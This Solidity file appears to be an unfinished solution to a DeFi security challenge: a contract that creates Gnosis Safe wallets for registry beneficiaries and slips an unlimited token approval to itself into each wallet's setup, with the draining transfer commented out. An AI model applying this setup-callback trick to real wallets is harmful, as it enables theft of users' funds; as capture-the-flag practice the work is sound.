// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IGnosisSafe {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        address callback
    ) external returns (address proxy);

    function createProxy(
        address singleton,
        bytes memory data
    ) external returns (address proxy);

    function calculateCreateProxyWithNonceAddress(
        address _singleton,
        bytes calldata initializer,
        uint256 saltNonce
    ) external returns (address proxy);
}

contract testWalletRegistry {
    address player;
    address gnosisSafe;
    address token;
    address[] owners;
    uint globalIndex;
    address WalletRegistry;
    address gnosisSafeFacotry;
    address[4] proxys;

    constructor(
        address _token,
        address _player,
        address[] memory _owners,
        address _gnosisSafe,
        address _gnosisSafeFacotry,
        address _WalletRegistry
    ) {
        token = _token;
        player = _player;
        owners = _owners;
        gnosisSafe = _gnosisSafe;
        gnosisSafeFacotry = _gnosisSafeFacotry;
        WalletRegistry = _WalletRegistry;

        while (globalIndex < 4) {
            address[] memory owner = new address[](1);
            owner[0] = owners[globalIndex];
            bytes memory data = abi.encodeWithSelector(
                this.setup.selector,
                owner,
                1,
                // address(0),
                // "",
                token,
                abi.encodeWithSignature(
                    "approve(address,uint256)",
                    address(this),
                    type(uint256).max
                ),
                address(0),
                address(this),
                0,
                address(this)
            );

            address proxy = IGnosisSafe(gnosisSafeFacotry)
                .createProxyWithCallback(
                    gnosisSafe,
                    data,
                    globalIndex,
                    WalletRegistry
                );
            console.log("proxy1", proxy);
            printTokenBalance(token, proxy, "one proxy");
            console.log(
                "allowance",
                IERC20(token).allowance(proxy, address(this))
            );
            // IERC20(token).transferFrom(
            //     proxy,
            //     address(this),
            //     IERC20(token).balanceOf(proxy)
            // );
            // printTokenBalance(token, player, "player balance");
            // proxys[i] = proxy;
            // proxy.call("111");
            globalIndex++;
        }
    }

    function end() external {}

    function printTokenBalance(
        address _token,
        address addr,
        string memory msg
    ) public returns (uint256) {
        (bool suc, bytes memory bal) = _token.call(
            abi.encodeWithSignature("balanceOf(address)", addr)
        );
        require(suc, msg);
        uint256 balance = abi.decode(bal, (uint256));

        console.log(msg, balance);
        return balance;
    }

    function setup(
        address[] calldata _owners,
        uint256 _threshold,
        address to,
        bytes calldata data,
        address fallbackHandler,
        address paymentToken,
        uint256 payment,
        address payable paymentReceiver
    ) external {}

    function stringToAddress(
        string memory _address
    ) public pure returns (address) {
        string memory cleanAddress = remove0xPrefix(_address);
        bytes20 _addressBytes = parseHexStringToBytes20(cleanAddress);
        return address(_addressBytes);
    }

    function remove0xPrefix(
        string memory _hexString
    ) internal pure returns (string memory) {
        if (
            bytes(_hexString).length >= 2 &&
            bytes(_hexString)[0] == "0" &&
            (bytes(_hexString)[1] == "x" || bytes(_hexString)[1] == "X")
        ) {
            return substring(_hexString, 2, bytes(_hexString).length);
        }
        return _hexString;
    }

    function substring(
        string memory _str,
        uint256 _start,
        uint256 _end
    ) internal pure returns (string memory) {
        bytes memory _strBytes = bytes(_str);
        bytes memory _result = new bytes(_end - _start);
        for (uint256 i = _start; i < _end; i++) {
            _result[i - _start] = _strBytes[i];
        }
        return string(_result);
    }

    function parseHexStringToBytes20(
        string memory _hexString
    ) internal pure returns (bytes20) {
        bytes memory _bytesString = bytes(_hexString);
        uint160 _parsedBytes = 0;
        for (uint256 i = 0; i < _bytesString.length; i += 2) {
            _parsedBytes *= 256;
            uint8 _byteValue = parseByteToUint8(_bytesString[i]);
            _byteValue *= 16;
            _byteValue += parseByteToUint8(_bytesString[i + 1]);
            _parsedBytes += _byteValue;
        }
        return bytes20(_parsedBytes);
    }

    function parseByteToUint8(bytes1 _byte) internal pure returns (uint8) {
        if (uint8(_byte) >= 48 && uint8(_byte) <= 57) {
            return uint8(_byte) - 48;
        } else if (uint8(_byte) >= 65 && uint8(_byte) <= 70) {
            return uint8(_byte) - 55;
        } else if (uint8(_byte) >= 97 && uint8(_byte) <= 102) {
            return uint8(_byte) - 87;
        } else {
            revert(string(abi.encodePacked("Invalid byte value: ", _byte)));
        }
    }

    fallback() external payable {}

    receive() external payable {}
}
